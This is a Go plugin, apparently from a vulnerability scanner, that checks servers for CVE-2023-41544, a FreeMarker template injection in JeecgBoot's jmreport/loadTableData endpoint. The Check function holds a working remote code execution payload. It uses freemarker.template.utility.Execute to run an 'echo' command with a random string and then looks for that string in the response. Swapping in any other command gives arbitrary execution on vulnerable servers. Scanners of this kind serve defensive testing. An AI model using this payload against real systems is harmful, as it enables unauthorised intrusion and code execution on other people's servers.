package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"strings"
)

func init() {
	Register("jeecgboot_rce_cve_2023_41544", &jeecgboot_rce_cve_2023_41544{})
}

type jeecgboot_rce_cve_2023_41544 struct{}

func (p *jeecgboot_rce_cve_2023_41544) Info() PluginInfo {
	return PluginInfo{
		Name:     "JeecgBoot 服务器端代码注入",
		VulnInfo: "eecg Boot(或者称为JeecgQ-Boot)是一款基于代码生成器的开源企业级快速开发平台，Jeecg Boot jmreport/loadTableData接口存在FreeMarker SSTI注入漏洞，攻击者可以通过操纵应用程序的模板引擎来执行恶意代码或获取敏感信息。这种漏洞可能会导致整个应用程序被入侵，造成严重的安全问题。",
		VulnID:   "CVE-2023-41544",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "3.4.0 <= version < 3.5.3",
		CWE:      "CWE-94	代码注入",
	}
}

func (p *jeecgboot_rce_cve_2023_41544) Check(netloc string) bool {
	rand_str := utils.GenRandom(10)
	payload := `{"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"`
	payload += "echo " + rand_str
	payload += `\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}`
	req, err := http.NewRequest("POST", netloc+"/jeecg-boot/jmreport/loadTableData", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}
	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, rand_str) {
		return true
	}
	return false
}
